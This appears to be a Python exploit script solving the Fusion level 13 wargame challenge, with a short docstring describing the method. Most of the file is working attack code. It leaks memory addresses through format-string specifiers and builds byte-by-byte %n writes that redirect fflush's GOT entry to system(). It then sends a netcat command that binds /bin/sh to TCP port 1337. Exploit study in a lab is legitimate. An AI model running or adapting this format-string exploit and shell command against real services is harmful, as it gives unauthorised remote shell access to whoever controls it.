#!/usr/bin/env python
'''
solution is fully mine, but there is another writeup that explains things that
are partly found in this exploit:
https://r3v3rs3r.wordpress.com/2014/07/27/solving-fusion-level-13/

First we leak some data from stack with direct parameter access and default 
access, calculate the base addresses of modules. From the calculated addresses
we have the system() addr, fflush.got.plt addr and the address of the first 
parameter on stack of fflush. In the second round we have 3different variables 
controlled: user, pass, email. Email can store our payload (revshell), user can
overwrite fflush's pointer to point to system() and pass can overwrite the 
memaddr that points to the fflush first parameter on stack. In the second round
just after the fprintf we are going to execute fflush which points to system at
that moment. Bumm, there is our shell.
While loop is needed to look for addresses that can be modified in less than 63
bytes. If any of the parameters are more than 62bytes, it won't be process 
properly.
'''

import socket
import struct

TCP_IP = '10.0.0.1'
TCP_PORT = 20013
BUFFER_SIZE = 1024

#%128$x - /lib/i386-linux-gnu/ld-2.13.so - ld base + 0x10c9c
#%9$x - heap - base + 0x1a0 - won't be used, btw
#%08x - stack - relative random addr on stack
#ld base - libc base = 0x189000
#(gdb) p system
#$28 = {<text variable, no debug info>} 0xb7645b20 <__libc_system>
#(gdb) p/x 0xb7645b20 - 0xb7609000
#$29 = 0x3cb20 - system() from libc
#fflush.got.plt - level13 base + 0x3b74
#level13 base = ldbase + 0x23000

loop = 0

while True:
	print "Trying to get proper addresses to set up not so lengthy format strings %d" % loop
	loop += 1

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((TCP_IP, TCP_PORT))
	data = s.recv(BUFFER_SIZE)

	s.send("%128$x\n")
	data = s.recv(BUFFER_SIZE)
	s.send("%08x\n")
	data = s.recv(BUFFER_SIZE)
	s.send("%9$x\n")
	data = s.recv(BUFFER_SIZE)
	ldleak = int(data[21:29], 16)
	stackleak = int(data[50:58], 16)
	heapleak = int(data[80:88], 16)
	ldbase = ldleak - 0x10c9c 
	level13base = ldbase + 0x23000
	fflushgotplt = level13base + 0xb74
	libcbase = ldbase - 0x189000
	systemaddr = libcbase + 0x3cb20
	cmdlineaddr = stackleak + 0x80
	systemarg = libcbase + 0x178880

	data = s.recv(BUFFER_SIZE)
	s.send("yes\n")
	data = s.recv(BUFFER_SIZE)

	bw = 0x21
	byte4 = (((systemaddr & 0xFF) - bw) & 0xFF) + 8
	bw += (byte4 + 5 + (3-len(str(byte4)))) & 0xffff
	byte3 = ((((systemaddr >> 8) & 0xFF) - bw) & 0xFF) + 8
	bw += (byte3 + 5 + (3-len(str(byte3)))) & 0xffff
	byte2 = ((((systemaddr >> 16) & 0xFF) - bw) & 0xFF) + 8
	bw += (byte2 + 5 + (3-len(str(byte2)))) & 0xffff
	byte1 = ((((systemaddr >> 24) & 0xFF) - bw) & 0xFF) + 8
	bw += (byte1 + 5 + (3-len(str(byte1)))) & 0xffff

	format1 = struct.pack("<I", fflushgotplt)+"%"+str(byte4)+"x%522$nz"+"z"*(3-len(str(byte4)))+struct.pack("<I", fflushgotplt+1)+"%"+str(byte3)+"x%526$nz"+"z"*(3-len(str(byte3)))+struct.pack("<I", fflushgotplt+2)+"%"+str(byte2)+"x%530$nz"+"z"*(3-len(str(byte2)))+struct.pack("<I", fflushgotplt+3)+"%"+str(byte1)+"x%534$n"

	bw += 0x0c + 0x07
	byte4 = (((cmdlineaddr & 0xFF) - bw) & 0xFF) + 8
	bw += (byte4 + 5 + (3-len(str(byte4)))) & 0xffff
	byte3 = ((((cmdlineaddr >> 8) & 0xFF) - bw) & 0xFF) + 8
	bw += (byte3 + 5 + (3-len(str(byte3)))) & 0xffff
	byte2 = ((((cmdlineaddr >> 16) & 0xFF) - bw) & 0xFF) + 8
	bw += (byte2 + 5 + (3-len(str(byte2)))) & 0xffff
	byte1 = ((((cmdlineaddr >> 24) & 0xFF) - bw) & 0xFF) + 8
	bw += (byte1 + 5 + (3-len(str(byte1)))) & 0xffff

	format2 = struct.pack("<I", systemarg)+"%"+str(byte4)+"x%538$nz"+"z"*(3-len(str(byte4)))+struct.pack("<I", systemarg+1)+"%"+str(byte3)+"x%542$nz"+"z"*(3-len(str(byte3)))+struct.pack("<I", systemarg+2)+"%"+str(byte2)+"x%546$nz"+"z"*(3-len(str(byte2)))+struct.pack("<I", systemarg+3)+"%"+str(byte1)+"x%550$n"
	if (len(format1) == 62 and (len(format2) == 62)):
		print "Exploiting!"
		break
	else:
		s.close()

s.send(format1)
data = s.recv(BUFFER_SIZE)
s.send(format2)
data = s.recv(BUFFER_SIZE)
s.send("/bin/nc.traditional -ltp 1337 -e/bin/sh\n")
data = s.recv(BUFFER_SIZE)
data = s.recv(BUFFER_SIZE)
print "You can connect to %s on port tcp/1337 now." % TCP_IP
